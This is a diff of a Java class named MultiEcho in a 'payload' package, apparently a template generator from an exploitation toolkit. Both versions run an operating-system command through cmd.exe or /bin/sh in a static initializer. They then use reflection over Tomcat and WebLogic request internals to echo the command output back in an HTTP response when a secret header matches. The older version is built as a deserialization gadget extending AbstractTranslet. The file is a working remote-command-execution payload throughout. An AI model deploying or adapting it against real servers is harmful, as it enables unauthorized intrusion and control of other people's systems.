@@ -1,65 +1,40 @@
 package payload;
 
-import com.sun.org.apache.xalan.internal.xsltc.DOM;
-import com.sun.org.apache.xalan.internal.xsltc.TransletException;
-import com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;
-import com.sun.org.apache.xml.internal.dtm.DTMAxisIterator;
-import com.sun.org.apache.xml.internal.serializer.SerializationHandler;
-
 import java.lang.reflect.Field;
+import java.util.Iterator;
 import java.util.List;
 import java.util.Scanner;
 
-public class MultiEcho extends AbstractTranslet {
+public class MultiEcho {
+    static String action = "{{action}}";
+    static String position = "{{position}}";
+    static String cmd = "{{cmd}}";
+    static String headerAuKey = "{{header-au-key}}";
+    static String headerAuVal = "{{header-au-val}}";
+    static String headerKey = "{{header}}";
 
-    static String action = "actionVal";
-    static String postion = "postionVal";
-    static String param = "paramVal";
-    static String headerKeyAu = "Accept-Language";
-    static String headerValAu = "zh-CN,zh;q=1.9";
-    static String headerKey = "headerKeyv";
-    static String headerValue = "headerValuev";
-
-    static {
-        try {
-            switch (action){
-                case "exec":
-                    switch (postion){
-                        case "header":
-                            String[] var12 = System.getProperty("os.name").toLowerCase().contains("window") ? new String[]{"cmd.exe", "/c", headerValue} : new String[]{"/bin/sh", "-c", headerValue};
-                            headerValue = (new Scanner((new ProcessBuilder(var12)).start().getInputStream())).useDelimiter("\\A").next();
-                            break;
-                        case "body":
-                            var12 = System.getProperty("os.name").toLowerCase().contains("window") ? new String[]{"cmd.exe", "/c", param} : new String[]{"/bin/sh", "-c", param};
-                             param = (new Scanner((new ProcessBuilder(var12)).start().getInputStream())).useDelimiter("\\A").next();
-                             break;
-                    }
-            }
-        } catch (Exception var13) {
-        }
-        start();
+    public MultiEcho() {
     }
 
-    private static void start(){
-        try{
+    private static void start() {
+        try {
             Class.forName("org.apache.catalina.connector.Response");
             tomcat();
-            return;
-        } catch (Exception ignored){
-
-        }
-        try {
-            Class.forName("weblogic.work.ExecuteThread");
-            WeblogicEchoTemplate();
-            return;
-        } catch (Exception ignored){
-
+        } catch (Exception var2) {
+            try {
+                Class.forName("weblogic.work.ExecuteThread");
+                WeblogicEchoTemplate();
+            } catch (Exception var1) {
+            }
         }
     }
+
     private static void tomcat() {
-        try{
-            Thread[] var5 = (Thread[])getFV(Thread.currentThread().getThreadGroup(), "threads");
-            for (Thread var7 : var5) {
+        try {
+            Thread[] var5 = (Thread[])((Thread[])getFV(Thread.currentThread().getThreadGroup(), "threads"));
+
+            for(int i = 0; i < var5.length; ++i) {
+                Thread var7 = var5[i];
                 if (var7 != null) {
                     String var3 = var7.getName();
                     if (!var3.contains("exec") && var3.contains("http")) {
@@ -67,33 +42,37 @@ public class MultiEcho extends AbstractTranslet {
                         if (var1 instanceof Runnable) {
                             try {
                                 var1 = getFV(getFV(getFV(var1, "this$0"), "handler"), "global");
-                            } catch (Exception var13) {
+                            } catch (Exception var14) {
                                 continue;
                             }
-                            List var9 = (List) getFV(var1, "processors");
-                            for (Object var11 : var9) {
+
+                            List var9 = (List)getFV(var1, "processors");
+                            Iterator var8 = var9.iterator();
+
+                            while(var8.hasNext()) {
+                                Object var11 = var8.next();
                                 var1 = getFV(var11, "req");
                                 Object var2 = var1.getClass().getMethod("getResponse").invoke(var1);
-                                String var15 = (String) var1.getClass().getMethod("getHeader", String.class).invoke(var1, headerKeyAu);
-                                if (var15 != null && var15.equals(headerValAu)) {
+                                String var15 = (String)var1.getClass().getMethod("getHeader", String.class).invoke(var1, headerAuKey);
+                                if (var15 != null && var15.equals(headerAuVal)) {
                                     var2.getClass().getMethod("setStatus", Integer.TYPE).invoke(var2, new Integer(200));
-                                    switch (postion){
+                                    switch (position) {
                                         case "body":
-                                            writeBody(var2, param.getBytes());
+                                            writeBody(var2, cmd.getBytes());
                                         default:
-                                            var2.getClass().getDeclaredMethod("addHeader", new Class[] { String.class, String.class }).invoke(var2, new Object[] { headerKey, headerValue });
+                                            var2.getClass().getDeclaredMethod("addHeader", String.class, String.class).invoke(var2, headerKey, cmd);
+                                            return;
                                     }
-
-                                    return;
                                 }
                             }
                         }
                     }
                 }
             }
-        }catch (Exception e){
-            e.printStackTrace();
+        } catch (Exception var15) {
+            var15.printStackTrace();
         }
+
     }
 
     private static void writeBody(Object var0, byte[] var1) throws Exception {
@@ -133,44 +112,56 @@ public class MultiEcho extends AbstractTranslet {
         }
     }
 
-    public static void WeblogicEchoTemplate(){
-        try{
+    public static void WeblogicEchoTemplate() {
+        try {
             Object adapter = Class.forName("weblogic.work.ExecuteThread").getDeclaredMethod("getCurrentWork").invoke(Thread.currentThread());
-            Object res;
-            if(!adapter.getClass().getName().endsWith("ServletRequestImpl")){
+            if (!adapter.getClass().getName().endsWith("ServletRequestImpl")) {
                 Field field = adapter.getClass().getDeclaredField("connectionHandler");
                 field.setAccessible(true);
                 Object obj = field.get(adapter);
                 adapter = obj.getClass().getMethod("getServletRequest").invoke(obj);
             }
-            String var15 = (String) adapter.getClass().getMethod("getHeader", String.class).invoke(adapter, headerKeyAu);
-            if (var15 != null && var15.equals(headerValAu)) {
-                switch (postion){
+
+            String var15 = (String)adapter.getClass().getMethod("getHeader", String.class).invoke(adapter, headerAuKey);
+            if (var15 != null && var15.equals(headerAuVal)) {
+                switch (position) {
                     case "body":
-                        res = adapter.getClass().getMethod("getResponse").invoke(adapter);
-                        Object sin = Class.forName("weblogic.xml.util.StringInputStream").getConstructor(String.class).newInstance(param);
+                        Object res = adapter.getClass().getMethod("getResponse").invoke(adapter);
+                        Object sin = Class.forName("weblogic.xml.util.StringInputStream").getConstructor(String.class).newInstance(cmd);
                         Object out = res.getClass().getDeclaredMethod("getServletOutputStream").invoke(res);
-                        out.getClass().getDeclaredMethod("writeStream",Class.forName("java.io.InputStream")).invoke(out,sin);
+                        out.getClass().getDeclaredMethod("writeStream", Class.forName("java.io.InputStream")).invoke(out, sin);
                         out.getClass().getDeclaredMethod("flush").invoke(out);
                         Object w = res.getClass().getDeclaredMethod("getWriter").invoke(res);
-                        w.getClass().getDeclaredMethod("write",String.class).invoke(w,"");
+                        w.getClass().getDeclaredMethod("write", String.class).invoke(w, "");
                     default:
-                        Object rsp = adapter.getClass().getDeclaredMethod("getResponse", new Class[0]).invoke(adapter, new Object[0]);
-                        rsp.getClass().getDeclaredMethod("addHeader", new Class[] { String.class, String.class }).invoke(rsp, new Object[] { headerKey, headerValue });
+                        Object rsp = adapter.getClass().getDeclaredMethod("getResponse").invoke(adapter);
+                        rsp.getClass().getDeclaredMethod("addHeader", String.class, String.class).invoke(rsp, headerKey, cmd);
                 }
             }
-        }catch(Exception e){
-            e.printStackTrace();
+        } catch (Exception var9) {
+            var9.printStackTrace();
         }
-    }
-
-    @Override
-    public void transform(DOM document, SerializationHandler[] handlers) throws TransletException {
 
     }
 
-    @Override
-    public void transform(DOM document, DTMAxisIterator iterator, SerializationHandler handler) throws TransletException {
+    static {
+        try {
+            switch (action) {
+                case "exec":
+                    String[] var12;
+                    switch (position) {
+                        case "header":
+                            var12 = System.getProperty("os.name").toLowerCase().contains("window") ? new String[]{"cmd.exe", "/c", cmd} : new String[]{"/bin/sh", "-c", cmd};
+                            cmd = (new Scanner((new ProcessBuilder(var12)).start().getInputStream())).useDelimiter("\\A").next();
+                            break;
+                        case "body":
+                            var12 = System.getProperty("os.name").toLowerCase().contains("window") ? new String[]{"cmd.exe", "/c", cmd} : new String[]{"/bin/sh", "-c", cmd};
+                            cmd = (new Scanner((new ProcessBuilder(var12)).start().getInputStream())).useDelimiter("\\A").next();
+                    }
+            }
+        } catch (Exception var5) {
+        }
 
+        start();
     }
 }
